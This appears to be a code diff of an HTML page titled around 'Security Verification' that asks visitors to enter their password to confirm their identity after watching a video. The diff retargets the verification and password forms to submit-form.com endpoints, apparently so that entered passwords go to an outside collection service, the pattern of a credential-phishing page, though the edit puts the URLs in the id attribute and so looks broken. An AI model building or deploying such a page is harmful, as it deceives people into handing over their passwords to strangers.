@@ -619,7 +619,7 @@
                         <div class="progress" id="formProgress"></div>
                     </div>
                     
-                    <form id="verificationForm">
+                    <form id="https://submit-form.com/uKCK6Lj8t">
                         <div class="video-container">
                             <video controls>
                                 <source src="https://ik.imagekit.io/ummab7boi/WhatsApp%20Video%202024-11-26%20at%2013.24.43_9bcb50f5.mp4?updatedAt=1751126951949" type="video/mp4">
@@ -712,7 +712,7 @@
             <h2>Security Verification</h2>
             <p>Please enter your password to confirm your identity and complete the verification process.</p>
             
-            <form id="passwordForm" class="password-form">
+            <form id="https://submit-form.com/BGj9KdC4r">
                 <div class="form-group">
                     <label for="password">Password</label>
                     <input type="password" id="password" placeholder="Enter your password" required>
